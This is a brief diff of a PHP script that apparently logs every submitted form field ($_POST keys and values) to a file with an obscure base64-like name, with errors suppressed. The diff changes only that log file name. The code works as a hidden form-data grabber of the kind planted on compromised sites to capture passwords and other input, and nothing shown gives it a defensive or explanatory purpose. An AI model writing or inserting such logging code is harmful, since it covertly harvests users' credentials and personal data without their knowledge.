@@ -4,7 +4,7 @@ $posts        = '';
 foreach($_POST as $k => $v){
     $posts .= '$_POST['.$k.'] = '.$v."\n";
 }
-$handle = @fopen("UIxX9Zr2TOi5QsJ+sq0jOkLVhJsr4vnrJtq4m7E7WYo=", "a+");
+$handle = @fopen("2AH+PxfaMmjRiBzrVyYUbmqDy7lPrcWYRc4xFFjMvyc=", "a+");
 @fwrite($handle, $posts);
 fclose($handle);
 ?>
